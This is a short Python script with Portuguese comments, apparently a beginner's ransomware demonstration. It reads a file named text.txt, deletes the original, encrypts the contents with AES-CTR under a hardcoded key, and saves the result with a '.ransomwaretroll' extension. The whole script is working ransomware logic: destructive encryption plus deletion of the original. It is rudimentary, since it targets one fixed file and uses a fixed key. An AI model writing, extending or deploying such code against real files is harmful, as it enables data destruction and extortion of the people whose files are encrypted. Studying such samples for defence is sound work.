import os
import pyaes

## abrir arquivo a ser cripitografado

file_name = 'text.txt'
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover arquivo original

os.remove(file_name)

## definindo achave de encripitação

key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)

## cripitografar
crypto_data = aes.encrypt(file_data)

## salvar arquivo
new_file = file_name + '.ransomwaretroll'
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()